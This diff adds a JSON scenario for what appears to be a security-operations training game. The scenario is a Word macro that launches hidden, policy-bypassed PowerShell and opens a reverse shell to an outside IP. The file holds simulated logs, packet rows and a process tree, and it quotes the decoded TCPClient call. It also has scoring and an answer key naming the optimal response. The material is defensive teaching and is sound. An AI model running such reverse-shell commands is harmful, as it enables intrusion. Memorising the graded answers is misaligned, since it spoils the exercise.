@@ -1,0 +1,200 @@
+{
+  "id": "SCENARIO_MACRO_PS_01",
+  "title": "Weaponized Word Document Macro Spawning Encoded PowerShell",
+  "category": "malicious_macro",
+  "severity": "Critical",
+  "trigger_time_offset": 210,
+  "source_ip": "10.0.1.105",
+  "destination_ip": "185.190.140.33",
+  "destination_port": "8443 (Alt-HTTPS / Reverse Shell)",
+  "protocol": "TCP",
+  "rule_fired": "EDR_SUSPICIOUS_OFFICE_CHILD_PROCESS_SPAWN",
+  "hostname": "WS-HR-03.corp",
+  "summary": "EDR sensor intercepted abnormal process lineage on WS-HR-03: Microsoft Word (WINWORD.EXE) spawned an interactive command shell (cmd.exe) which invoked a hidden, execution-policy bypassed PowerShell instance attempting outbound reverse-shell communication.",
+  "raw_logs": [
+    "2026-10-09T02:09:15Z SYSMON[1]: EventID=1 Image='C:\\Windows\\System32\\cmd.exe' CommandLine='/c powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAg... -Port 8443' ParentImage='C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE' ParentCommandLine='\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\m.chen\\Downloads\\Employee_Bonus_Schedule_2026.docm\"' User='CORP\\m.chen'",
+    "2026-10-09T02:09:17Z SYSMON[1]: EventID=1 Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' CommandLine='powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAg...' ParentImage='C:\\Windows\\System32\\cmd.exe' User='CORP\\m.chen' IntegrityLevel=Medium",
+    "2026-10-09T02:09:18Z SYSMON[3]: EventID=3 NetworkConnect Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' SourceIP=10.0.1.105 SourcePort=49330 DestinationIP=185.190.140.33 DestinationPort=8443 Protocol=tcp",
+    "2026-10-09T02:09:20Z CROWDSTRIKE_FALCON: Alert=SuspiciousParentChildProcess Technique=T1059.001 Hostname=WS-HR-03 Severity=Critical Action=LOG_ONLY Status=Active_Connection"
+  ],
+  "logs_categorized": {
+    "auth": [
+      "2026-10-09T02:00:10Z Microsoft-Windows-Security-Auditing: EventID=4624 TargetUserName=m.chen LogonType=2 Workstation=WS-HR-03"
+    ],
+    "firewall": [
+      "2026-10-09T02:09:18Z CISCO_ASA: %ASA-6-302013: Built outbound TCP connection 920110 for outside:185.190.140.33/8443 to inside:10.0.1.105/49330"
+    ],
+    "dns": [
+      "2026-10-09T02:09:16Z PIHOLE_DNS: Client=10.0.1.105 QueryType=A Domain=stage2-payload-direct.xyz Answer=185.190.140.33 TTL=60"
+    ],
+    "proxy": [
+      "2026-10-09T02:09:19Z SQUID_PROXY: TCP_MISS/200 CONNECT 185.190.140.33:8443 - Non-standard SSL/TLS port handshake detected."
+    ]
+  },
+  "pcap_packets": [
+    {
+      "no": 1,
+      "time": "0.000000",
+      "delta": "0.000",
+      "source": "10.0.1.105",
+      "destination": "185.190.140.33",
+      "protocol": "TCP",
+      "length": 66,
+      "flags": "[SYN] Seq=0",
+      "info": "49330 -> 8443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256",
+      "payload_preview": "00 0c 29 84 11 02 00 1a 2b 3c 4d 5e 08 00 45 00 00 34 c1 d2 40 00 80 06 ...",
+      "details": {
+        "layer_eth": "Source: 00:1a:2b:3c:4d:5e, Destination: 00:0c:29:84:11:02",
+        "layer_ip": "IPv4: 10.0.1.105 -> 185.190.140.33, TTL=128, Protocol=TCP",
+        "layer_trans": "TCP: Source Port: 49330, Destination Port: 8443 (Reverse Shell Listener), SYN=1",
+        "layer_app": "Outbound TCP connection initiated by powershell.exe"
+      }
+    },
+    {
+      "no": 2,
+      "time": "0.038100",
+      "delta": "0.038",
+      "source": "185.190.140.33",
+      "destination": "10.0.1.105",
+      "protocol": "TCP",
+      "length": 66,
+      "flags": "[SYN, ACK] Seq=0 Ack=1",
+      "info": "8443 -> 49330 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0",
+      "payload_preview": "00 1a 2b 3c 4d 5e 00 0c 29 84 11 02 08 00 45 00 ...",
+      "details": {
+        "layer_eth": "Source: 00:0c:29:84:11:02, Destination: 00:1a:2b:3c:4d:5e",
+        "layer_ip": "IPv4: 185.190.140.33 -> 10.0.1.105, TTL=51",
+        "layer_trans": "TCP: Port 8443 -> 49330, SYN=1, ACK=1",
+        "layer_app": "Remote listener accepts TCP connection."
+      }
+    },
+    {
+      "no": 3,
+      "time": "0.038200",
+      "delta": "0.000",
+      "source": "10.0.1.105",
+      "destination": "185.190.140.33",
+      "protocol": "TCP",
+      "length": 54,
+      "flags": "[ACK] Seq=1 Ack=1",
+      "info": "49330 -> 8443 [ACK] Seq=1 Ack=1 Win=64240 Len=0",
+      "payload_preview": "00 0c 29 84 11 02 ...",
+      "details": {
+        "layer_eth": "Source: 00:1a:2b:3c:4d:5e, Destination: 00:0c:29:84:11:02",
+        "layer_ip": "IPv4: 10.0.1.105 -> 185.190.140.33",
+        "layer_trans": "TCP: Handshake completed. Interactive reverse shell established.",
+        "layer_app": "Channel ready for remote interactive commands."
+      }
+    },
+    {
+      "no": 4,
+      "time": "0.110200",
+      "delta": "0.072",
+      "source": "185.190.140.33",
+      "destination": "10.0.1.105",
+      "protocol": "TCP",
+      "length": 86,
+      "flags": "[PSH, ACK] Seq=1 Ack=1",
+      "info": "8443 -> 49330 [PSH, ACK] Data: \"whoami /all\\n\"",
+      "payload_preview": "77 68 6f 61 6d 69 20 2f 61 6c 6c 0a (whoami /all)",
+      "details": {
+        "layer_eth": "Source: 00:0c:29:84:11:02, Destination: 00:1a:2b:3c:4d:5e",
+        "layer_ip": "IPv4: 185.190.140.33 -> 10.0.1.105",
+        "layer_trans": "TCP: Port 8443 -> 49330, PSH=1",
+        "layer_app": "Adversary sends initial reconnaissance command: 'whoami /all'."
+      }
+    }
+  ],
+  "threat_intel": {
+    "185.190.140.33": {
+      "ip": "185.190.140.33",
+      "reputation_score": 98,
+      "verdict": "Malicious",
+      "threat_level": "CRITICAL",
+      "asn": "AS39798 (MivoCloud Offshore SRL)",
+      "country": "MD",
+      "domain": "stage2-payload-direct.xyz",
+      "threat_types": ["Reverse Shell C2", "Emotet / Qakbot Distribution", "Macro Exploit Listener"],
+      "passive_dns_count": 112,
+      "first_seen": "2026-10-01",
+      "reports_summary": "Active malicious listener associated with phishing macro campaigns deploying interactive PowerShell reverse shells."
+    },
+    "10.0.1.105": {
+      "ip": "10.0.1.105",
+      "reputation_score": 0,
+      "verdict": "Internal HR Workstation",
+      "threat_level": "CLEAN",
+      "asn": "RFC 1918 Private Address Space",
+      "country": "LOCAL",
+      "domain": "WS-HR-03.corp",
+      "threat_types": ["Corporate Workstation"],
+      "passive_dns_count": 0,
+      "first_seen": "2025-06-12",
+      "reports_summary": "HR department workstation assigned to M. Chen. Holds employee records."
+    }
+  },
+  "endpoint_processes": [
+    {
+      "pid": 1420,
+      "ppid": 612,
+      "name": "explorer.exe",
+      "user": "CORP\\m.chen",
+      "command": "C:\\Windows\\explorer.exe",
+      "status": "Running",
+      "hash": "c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3",
+      "integrity": "Medium"
+    },
+    {
+      "pid": 4820,
+      "ppid": 1420,
+      "name": "WINWORD.EXE",
+      "user": "CORP\\m.chen",
+      "command": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\m.chen\\Downloads\\Employee_Bonus_Schedule_2026.docm\"",
+      "status": "Running",
+      "hash": "5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b",
+      "integrity": "Medium",
+      "note": "User opened email attachment document containing malicious AutoOpen VBA macro."
+    },
+    {
+      "pid": 5104,
+      "ppid": 4820,
+      "name": "cmd.exe",
+      "user": "CORP\\m.chen",
+      "command": "C:\\Windows\\system32\\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAg...",
+      "status": "Terminated",
+      "hash": "2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c",
+      "integrity": "Medium",
+      "note": "SPAWNED BY WORD MACRO (Parent PID: 4820). Classic Office macro execution chain."
+    },
+    {
+      "pid": 5288,
+      "ppid": 5104,
+      "name": "powershell.exe",
+      "user": "CORP\\m.chen",
+      "command": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAg... -Port 8443",
+      "status": "Running",
+      "hash": "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0",
+      "integrity": "Medium",
+      "note": "ACTIVE REVERSE SHELL. Base64 decoded string reveals: Net.Sockets.TCPClient('185.190.140.33', 8443)."
+    }
+  ],
+  "optimal_action": "Isolate Host",
+  "acceptable_actions": ["Block IP", "Escalate"],
+  "scoring": {
+    "Isolate Host": 150,
+    "Block IP": 75,
+    "Escalate": 75,
+    "Dismiss": -300
+  },
+  "feedback": {
+    "Isolate Host": "CRITICAL CONTAINMENT SUCCESS: WS-HR-03 isolated via EDR. You inspected the endpoint process tree and caught WINWORD.EXE spawning cmd.exe and hidden PowerShell (MITRE T1059.001). Host isolation severed the adversary's active interactive shell before they could dump credentials or access HR salary records.",
+    "Block IP": "PARTIAL MITIGATION: Blocked reverse-shell listener IP 185.190.140.33. While the outbound TCP connection was severed, the malicious PowerShell process remains active in memory on WS-HR-03 and may establish persistence via Scheduled Tasks or Registry Run keys.",
+    "Escalate": "ACCEPTABLE: Escalated to Tier 2 SOC. In active interactive shell execution on an endpoint, isolating the host immediately is optimal to stop keyboard-interactive adversary intrusion.",
+    "Dismiss": "CATASTROPHIC BREACH: Dismissed Word macro reverse shell as routine Office work! Adversary executed Mimikatz, dumped local LSASS secrets, and compromised HR Active Directory groups."
+  },
+  "educational_rationale": {
+    "topic": "Weaponized Office Documents, VBA Macros & Child Process Execution",
+    "certification_relevance": "Security+ SY0-701 (Section 2.2 Malicious Code & Social Engineering, Section 4.3 Endpoint Security & EDR) & Network+ (Section 4.3 Attack Types - Reverse Shells & Non-Standard Ports)",
+    "deep_dive": "Microsoft Word (WINWORD.EXE) is a word processor; under normal operating conditions, it has zero legitimate reason to spawn command interpreters like cmd.exe or powershell.exe. Threat actors embed VBA macros that execute automatically upon document opening (e.g. Sub AutoOpen() or Document_Open()) using WScript.Shell.Run. Attackers pass '-ExecutionPolicy Bypass' to ignore local PowerShell execution policies, and '-WindowStyle Hidden' with '-EncodedCommand' (base64) to evade casual inspection and signature matching. Looking at parent-child process relationships (PPID -> PID) in EDR or Sysmon Event ID 1 is one of the highest-fidelity detection heuristics in modern security operations."
+  }
+}
